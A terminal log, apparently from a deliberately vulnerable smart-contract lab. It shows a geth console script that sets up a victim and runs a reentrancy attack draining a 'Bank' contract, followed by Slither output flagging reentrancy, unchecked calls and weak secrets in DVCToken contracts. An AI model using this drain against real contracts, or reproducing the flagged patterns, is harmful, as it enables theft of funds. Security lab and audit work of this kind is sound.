DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> console.log('Mallory Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
> 
DVCTokenSale.sol  DVCToken.sol      Migrations.sol    
> }
> })
> 
> 
> transferSomething()
> console.log("\n===============================================================================")
> console.log("Wait for SafeSending, Bank and Mallory contracts to be mined.")
> console.log("Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that the SafeSending, Mallory and Bank contract are mined.")
> console.log("\nUse `triggerAttack()` to start the attack.")
> console.log("===============================================================================\n")
> 
> 
> // set up initial state, s.t. the attack is possible
> function donateInitial() {
> console.log("[+] setting up contracts for attack");
> // first to some poor account, whos funds will be drained by the attacker
> bank.donate(eth.accounts[0], {from: eth.accounts[0], value: 100000});
> // and some inital funds for the attack contract
> bank.donate(mallory.address, {from: eth.accounts[1], value: 100000});
>   mallory.donate({from: eth.accounts[1], value: 100000})
>   admin.sleepBlocks(1)
> }
> 
> // print balances of the contracts
> function printStatus() {
>   console.log("")
>   console.log("[+] Current status:")
> console.log("Mallory has " + eth.getBalance(mallory.address) + " wei")
> console.log("Bank    has " + eth.getBalance(bank.address) + " wei")
> console.log("Mallory has " + bank.getBalance(mallory.address) + " wei deposited in Bank")
>   console.log("victim  has " + bank.getBalance(eth.accounts[0]) + " wei deposited in Bank")
>   if (eth.getBalance(bank.address) < bank.getBalance(eth.accounts[0])) {
>     console.log("Warning: bank doesn't have enough ether to give back victim's money")
>   }
>   console.log("")
> }
> 
> // perform attack
> function triggerAttack() {
> transferSomething();
> donateInitial();
> transferSomething();
> 
>   var preBalance = eth.getBalance(mallory.address)
>   printStatus()
>   admin.sleepBlocks(1)
> 
> console.log("[+] Triggering attack by sending wei to Mallory, which calls fallback")
> var t = mallory.attack(bank.address, {from: eth.accounts[1], gas: '4700000'})
> 
>   console.log("[+] Executed attack...")
>   transferSomething()
>   admin.sleepBlocks(3)
>   printStatus()
>   var gains = (eth.getBalance(mallory.address) - preBalance);
>   console.log("Mallory gained " + gains + " wei");
>   if (gains > 0) {
>     console.log("attack status: SUCCESS");
>   } else {
>     console.log("attack status: FAILED");
>   }
> 
> return t;
> }
> 
> 
> function getAttackTrace() {
> a = triggerAttack();
> return debug.traceTransaction(a);
> }
> 
> transferSomething()~
> 
> 
> ^C
sneha@sneha:~/dvcw/blockchain/contracts$ solcjs --version
0.8.19+commit.7dd6d404.Emscripten.clang
sneha@sneha:~/dvcw/blockchain/contracts$ set SOLC_VERSION=0.8.19+commit.7dd6d404.Emscripten.clang
sneha@sneha:~/dvcw/blockchain/contracts$ slither .
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.

ERROR:root:Error in .
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.


sneha@sneha:~/dvcw/blockchain/contracts$ export SOLC_VERSION=0.8.19+commit.7dd6d404.Emscripten.clang
sneha@sneha:~/dvcw/blockchain/contracts$ echo SOLC_VERSION
SOLC_VERSION
sneha@sneha:~/dvcw/blockchain/contracts$ echo $SOLC_VERSION
0.8.19+commit.7dd6d404.Emscripten.clang
sneha@sneha:~/dvcw/blockchain/contracts$ slither .
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 53, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: Version '0.8.19+commit.7dd6d404.Emscripten.clang' not installed (set by SOLC_VERSION). Run `solc-select install 0.8.19+commit.7dd6d404.Emscripten.clang`.

ERROR:root:Error in .
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 53, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: Version '0.8.19+commit.7dd6d404.Emscripten.clang' not installed (set by SOLC_VERSION). Run `solc-select install 0.8.19+commit.7dd6d404.Emscripten.clang`.


sneha@sneha:~/dvcw/blockchain/contracts$ solc-select install 0.8.19+commit.7dd6d404.Emscripten.clang
usage: solc-select install [-h] [INSTALL_VERSIONS ...]
solc-select install: error: argument INSTALL_VERSIONS: Invalid version '0.8.19+commit.7dd6d404.Emscripten.clang'.
sneha@sneha:~/dvcw/blockchain/contracts$ export SOLC_VERSION=0.8.19
sneha@sneha:~/dvcw/blockchain/contracts$ slither .
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 53, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: Version '0.8.19' not installed (set by SOLC_VERSION). Run `solc-select install 0.8.19`.

ERROR:root:Error in .
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 53, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: Version '0.8.19' not installed (set by SOLC_VERSION). Run `solc-select install 0.8.19`.


sneha@sneha:~/dvcw/blockchain/contracts$ solc-select install 0.8.19
Installing '0.8.19'...
Version '0.8.19' installed.
sneha@sneha:~/dvcw/blockchain/contracts$ slither .
Compilation warnings/errors on ./DVCToken.sol:
Error: Source file requires different compiler version (current compiler is 0.8.19+commit.7dd6d404.Linux.g++) - note that nightly builds are considered to be strictly less than the released version
 --> DVCToken.sol:1:1:
  |
1 | pragma solidity ^0.4.22;
  | ^^^^^^^^^^^^^^^^^^^^^^^^


Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 561, in _run_solc
    ret: Dict = json.loads(stdout)
  File "/usr/lib/python3.10/json/__init__.py", line 346, in loads
    return _default_decoder.decode(s)
  File "/usr/lib/python3.10/json/decoder.py", line 337, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "/usr/lib/python3.10/json/decoder.py", line 355, in raw_decode
    raise JSONDecodeError("Expecting value", s, err.value) from None
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 565, in _run_solc
    raise InvalidCompilation(f"Invalid solc compilation {stderr}")
crytic_compile.platform.exceptions.InvalidCompilation: Invalid solc compilation Error: Source file requires different compiler version (current compiler is 0.8.19+commit.7dd6d404.Linux.g++) - note that nightly builds are considered to be strictly less than the released version
 --> DVCToken.sol:1:1:
  |
1 | pragma solidity ^0.4.22;
  | ^^^^^^^^^^^^^^^^^^^^^^^^


ERROR:root:Error in .
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 561, in _run_solc
    ret: Dict = json.loads(stdout)
  File "/usr/lib/python3.10/json/__init__.py", line 346, in loads
    return _default_decoder.decode(s)
  File "/usr/lib/python3.10/json/decoder.py", line 337, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "/usr/lib/python3.10/json/decoder.py", line 355, in raw_decode
    raise JSONDecodeError("Expecting value", s, err.value) from None
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 565, in _run_solc
    raise InvalidCompilation(f"Invalid solc compilation {stderr}")
crytic_compile.platform.exceptions.InvalidCompilation: Invalid solc compilation Error: Source file requires different compiler version (current compiler is 0.8.19+commit.7dd6d404.Linux.g++) - note that nightly builds are considered to be strictly less than the released version
 --> DVCToken.sol:1:1:
  |
1 | pragma solidity ^0.4.22;
  | ^^^^^^^^^^^^^^^^^^^^^^^^



sneha@sneha:~/dvcw/blockchain/contracts$ solc-select install 0.4.22
Installing '0.4.22'...
Version '0.4.22' installed.
sneha@sneha:~/dvcw/blockchain/contracts$ export SOLC_VERSION=0.4.22
sneha@sneha:~/dvcw/blockchain/contracts$ slither .
Compilation warnings/errors on ./DVCToken.sol:
./DVCToken.sol:35:3: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use "constructor(...) { ... }" instead.
  function DVCToken (uint256 _initialSupply) public payable {
  ^ (Relevant source part starts here and spans across multiple lines).
./DVCToken.sol:52:5: Warning: Invoking events without "emit" prefix is deprecated.
    Transfer(msg.sender, _to, _value);
    ^-------------------------------^
./DVCToken.sol:64:5: Warning: Invoking events without "emit" prefix is deprecated.
    Approval(msg.sender, _spender, _value);
    ^------------------------------------^
./DVCToken.sol:79:5: Warning: Invoking events without "emit" prefix is deprecated.
    Transfer(msg.sender, _to, _value);
    ^-------------------------------^
./DVCToken.sol:93:5: Warning: Return value of low-level calls not used.
    _to.call.value(_value)();
    ^----------------------^
./DVCToken.sol:96:5: Warning: Invoking events without "emit" prefix is deprecated.
    Withdraw(_to, _tokens);
    ^--------------------^
./DVCToken.sol:101:3: Warning: No visibility specified. Defaulting to "public". 
  function () payable {
  ^ (Relevant source part starts here and spans across multiple lines).

Compilation warnings/errors on ./DVCTokenSale.sol:
./DVCToken.sol:35:3: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use "constructor(...) { ... }" instead.
  function DVCToken (uint256 _initialSupply) public payable {
  ^ (Relevant source part starts here and spans across multiple lines).
./DVCTokenSale.sol:36:3: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use "constructor(...) { ... }" instead.
  function DVCTokenSale(DVCToken _tokenContract, uint256 _tokenPrice, uint256 _tokensSold) public {
  ^ (Relevant source part starts here and spans across multiple lines).
./DVCToken.sol:52:5: Warning: Invoking events without "emit" prefix is deprecated.
    Transfer(msg.sender, _to, _value);
    ^-------------------------------^
./DVCToken.sol:64:5: Warning: Invoking events without "emit" prefix is deprecated.
    Approval(msg.sender, _spender, _value);
    ^------------------------------------^
./DVCToken.sol:79:5: Warning: Invoking events without "emit" prefix is deprecated.
    Transfer(msg.sender, _to, _value);
    ^-------------------------------^
./DVCToken.sol:93:5: Warning: Return value of low-level calls not used.
    _to.call.value(_value)();
    ^----------------------^
./DVCToken.sol:96:5: Warning: Invoking events without "emit" prefix is deprecated.
    Withdraw(_to, _tokens);
    ^--------------------^
./DVCTokenSale.sol:64:14: Warning: Using contract member "call" inherited from the address type is deprecated. Convert the contract to "address" type to access the member, for example use "address(contract).call" instead.
	    require(tokenContract.call(bytes4(keccak256("transfer(address,uint256)")), msg.sender, amountToBuy), 'The first transfer failed');
	            ^----------------^
./DVCTokenSale.sol:69:6: Warning: Invoking events without "emit" prefix is deprecated.
	    Buy(msg.sender, amountToBuy);
	    ^--------------------------^
./DVCTokenSale.sol:73:12: Warning: Using contract member "call" inherited from the address type is deprecated. Convert the contract to "address" type to access the member, for example use "address(contract).call" instead.
	  require(tokenContract.call(bytes4(keccak256("transfer(address,uint256)")), msg.sender, _numberOfTokens), 'The transfer failed'); 
	          ^----------------^
./DVCTokenSale.sol:76:5: Warning: Invoking events without "emit" prefix is deprecated.
    Buy(msg.sender, _numberOfTokens);
    ^------------------------------^
./DVCTokenSale.sol:86:13: Warning: Using contract member "send" inherited from the address type is deprecated. Convert the contract to "address" type to access the member, for example use "address(contract).send" instead.
    require(tokenContract.send(amountToWithdraw), 'Error:  sending money to DVCToken contract failed');
            ^----------------^
./DVCTokenSale.sol:90:5: Warning: Invoking events without "emit" prefix is deprecated.
    Sell(msg.sender, _numberOfTokens);
    ^-------------------------------^
./DVCToken.sol:101:3: Warning: No visibility specified. Defaulting to "public". 
  function () payable {
  ^ (Relevant source part starts here and spans across multiple lines).
./DVCTokenSale.sol:40:40: Warning: "block.blockhash()" has been deprecated in favor of "blockhash()"
    secret = bytes32(uint256(keccak256(block.blockhash(block.number), block.timestamp)));
                                       ^-------------^
./DVCTokenSale.sol:96:3: Warning: No visibility specified. Defaulting to "public". 
  function changeAdmin(address _admin, bytes32 _secret) {
  ^ (Relevant source part starts here and spans across multiple lines).
./DVCTokenSale.sol:112:3: Warning: No visibility specified. Defaulting to "public". 
  function endSale() {
  ^ (Relevant source part starts here and spans across multiple lines).
./DVCTokenSale.sol:118:3: Warning: No visibility specified. Defaulting to "public". 
  function () payable {
  ^ (Relevant source part starts here and spans across multiple lines).

Compilation warnings/errors on ./Migrations.sol:
./Migrations.sol:11:5: Warning: Defining constructors as functions with the same name as the contract is deprecated. Use "constructor(...) { ... }" instead.
    function Migrations() public {
    ^ (Relevant source part starts here and spans across multiple lines).

INFO:Detectors:
DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98) sends eth to arbitrary user
	Dangerous calls:
	- _to.call.value(_value)() (DVCToken.sol#93)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations
INFO:Detectors:
Reentrancy in DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98):
	External calls:
	- _to.call.value(_value)() (DVCToken.sol#93)
	State variables written after the call(s):
	- balanceOf[_to] -= _tokens (DVCToken.sol#94)
	DVCToken.balanceOf (DVCToken.sol#29) can be used in cross function reentrancies:
	- DVCToken.DVCToken(uint256) (DVCToken.sol#35-38)
	- DVCToken.balanceOf (DVCToken.sol#29)
	- DVCToken.transfer(address,uint256) (DVCToken.sol#43-56)
	- DVCToken.transferFrom(address,address,uint256) (DVCToken.sol#71-81)
	- DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities
INFO:Detectors:
DVCToken.transferFrom(address,address,uint256) (DVCToken.sol#71-81) contains a tautology or contradiction:
	- require(bool,string)(balanceOf[_from] - _value >= 0,Not enough funds) (DVCToken.sol#72)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#tautology-or-contradiction
INFO:Detectors:
DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98) ignores return value by _to.call.value(_value)() (DVCToken.sol#93)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#unchecked-low-level-calls
INFO:Detectors:
Reentrancy in DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98):
	External calls:
	- _to.call.value(_value)() (DVCToken.sol#93)
	Event emitted after the call(s):
	- Withdraw(_to,_tokens) (DVCToken.sol#96)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-3
INFO:Detectors:
Pragma version^0.4.22 (DVCToken.sol#1) is known to contain severe issues (https://solidity.readthedocs.io/en/latest/bugs.html)
solc-0.4.22 is known to contain severe issues (https://solidity.readthedocs.io/en/latest/bugs.html)Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity
INFO:Detectors:
Low level call in DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98):
	- _to.call.value(_value)() (DVCToken.sol#93)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#low-level-calls
INFO:Detectors:
Parameter DVCToken.transfer(address,uint256)._to (DVCToken.sol#43) is not in mixedCase
Parameter DVCToken.transfer(address,uint256)._value (DVCToken.sol#43) is not in mixedCase
Parameter DVCToken.approve(address,uint256)._spender (DVCToken.sol#61) is not in mixedCase
Parameter DVCToken.approve(address,uint256)._value (DVCToken.sol#61) is not in mixedCase
Parameter DVCToken.transferFrom(address,address,uint256)._from (DVCToken.sol#71) is not in mixedCase
Parameter DVCToken.transferFrom(address,address,uint256)._to (DVCToken.sol#71) is not in mixedCase
Parameter DVCToken.transferFrom(address,address,uint256)._value (DVCToken.sol#71) is not in mixedCase
Parameter DVCToken.withdraw(address,uint256,uint256)._to (DVCToken.sol#87) is not in mixedCase
Parameter DVCToken.withdraw(address,uint256,uint256)._tokens (DVCToken.sol#87) is not in mixedCase
Parameter DVCToken.withdraw(address,uint256,uint256)._value (DVCToken.sol#87) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
INFO:Detectors:
DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98) uses literals with too many digits:
	- amountToWithdraw = _tokens * 1000000000000000000 (DVCToken.sol#88)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#too-many-digits
INFO:Detectors:
DVCToken.name (DVCToken.sol#7) should be constant 
DVCToken.standard (DVCToken.sol#9) should be constant 
DVCToken.symbol (DVCToken.sol#8) should be constant 
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#state-variables-that-could-be-declared-constant
INFO:Detectors:
DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98) sends eth to arbitrary user
	Dangerous calls:
	- _to.call.value(_value)() (DVCToken.sol#93)
DVCTokenSale.sellTokens(uint256) (DVCTokenSale.sol#83-91) sends eth to arbitrary user
	Dangerous calls:
	- require(bool,string)(tokenContract.send(amountToWithdraw),Error:  sending money to DVCToken contract failed) (DVCTokenSale.sol#86)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations
INFO:Detectors:
Reentrancy in DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98):
	External calls:
	- _to.call.value(_value)() (DVCToken.sol#93)
	State variables written after the call(s):
	- balanceOf[_to] -= _tokens (DVCToken.sol#94)
	DVCToken.balanceOf (DVCToken.sol#29) can be used in cross function reentrancies:
	- DVCToken.DVCToken(uint256) (DVCToken.sol#35-38)
	- DVCToken.balanceOf (DVCToken.sol#29)
	- DVCToken.transfer(address,uint256) (DVCToken.sol#43-56)
	- DVCToken.transferFrom(address,address,uint256) (DVCToken.sol#71-81)
	- DVCToken.withdraw(address,uint256,uint256) (DVCToken.sol#87-98)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities
INFO:Detectors:
DVCTokenSale.changeAdmin(address,bytes32) (DVCTokenSale.sol#96-105) uses a dangerous strict equality:
	- require(bool,string)(_secret == secret,You shall not pass) (DVCTokenSale.sol#102)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#dangerous-strict-equalities
INFO:Detectors:
Reentrancy in DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78):
	External calls:
	- require(bool,string)(tokenContract.balanceOf(this) >= _numberOfTokens,The DVCTokenSale contract does not have enough tokens to sell) (DVCTokenSale.sol#57)
	- require(bool,string)(tokenContract.call(bytes4(keccak256()(transfer(address,uint256))),msg.sender,amountToBuy),The first transfer failed) (DVCTokenSale.sol#64)
	State variables written after the call(s):
	- claimedBonus[msg.sender] = true (DVCTokenSale.sol#66)
	DVCTokenSale.claimedBonus (DVCTokenSale.sol#30) can be used in cross function reentrancies:
	- DVCTokenSale.buyTokens(uint256) (DVCTokenSale.sol#54-78)
